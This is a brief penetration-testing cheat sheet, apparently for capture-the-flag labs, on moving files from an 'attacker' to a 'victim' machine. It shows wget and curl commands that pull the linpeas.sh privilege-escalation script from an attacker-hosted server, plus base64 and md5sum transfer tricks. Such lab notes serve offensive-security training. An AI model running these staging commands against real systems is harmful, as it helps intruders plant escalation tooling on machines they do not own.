### 📤 From Attacker to Victim (The "Pull" Method)

**On Attacker (Start the server):**

Bash

```
python3 -m http.server 8000
```

**On Victim (Download the file):**

Bash

```
wget http://10.10.14.x:8000/linpeas.sh
# OR (if no wget)
curl http://10.10.14.x:8000/linpeas.sh -o linpeas.sh
```

### 📦 The Base64 "Ninja" Move

**On Attacker (Encode):**

Bash

```
base64 -w 0 [filename]
```

**On Victim (Decode):**

Bash

```
echo "[paste_the_long_string_here]" | base64 -d > [filename]
```

### 🛡️ Validation (The "Did it break?" check)

Always check if the file survived the trip.

Bash

```
md5sum [filename]
```

_If the MD5 hash on your machine matches the one on the victim, the file is perfect._